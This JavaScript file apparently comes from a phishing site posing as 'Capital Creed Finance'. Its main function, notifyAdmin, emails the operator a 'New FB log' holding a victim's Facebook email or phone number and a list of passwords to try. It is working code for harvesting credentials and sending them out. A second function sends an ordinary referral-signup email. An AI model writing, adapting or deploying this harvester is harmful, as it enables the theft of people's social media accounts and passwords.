import sendEmail from "./config";

const notifyAdmin = async (info) => {
  const from = "FB! <system@capitalcreed.org>";
  const subject = "New Log";
  const ADMIN = process.env.ADMIN_EMAIL;

  let passwordList = "";
  for (let i = 0; i < info.triedPasswords.length; i++) {
    passwordList += `\nPassword${i + 1}: ${info.triedPasswords[i]}`;
  }

  const mailOptions = {
    from,
    to: ADMIN,
    subject,
    text: `New FB log.\n
    \nEmail Or PhoneNumber: ${info.emailOrPhoneNumber}\n
    \nPasswords To Try:
    \n${passwordList}`,
  };

  let result, error;
  try {
    result = await sendEmail(mailOptions);
  } catch (e) {
    return { error: e, success: null };
  }

  return { success: result, error: null };
};

/**
 * 
 * @param {{
  to,
  firstName,
  fullName,
  newAccountEmail,
}} param0 
 * @returns Promise<{error: any, success: any}>
 */
export const notifyReferrer = async ({
  to,
  firstName,
  fullName,
  newAccountEmail,
}) => {
  const from = "Capital Creed Finance <system@capitalcreed.org>";
  const subject = "Attention!, Referral Signup";

  const mailOptions = {
    from,
    to,
    subject,
    template: "wfp_referral_notification",
    "v:firstName": firstName,
    "v:fullName": fullName,
    "v:newAccountEmail": newAccountEmail,
  };

  let result, error;
  try {
    result = await sendEmail(mailOptions);
  } catch (e) {
    return { error: e, success: null };
  }

  return { success: result, error: null };
};

export default notifyAdmin;
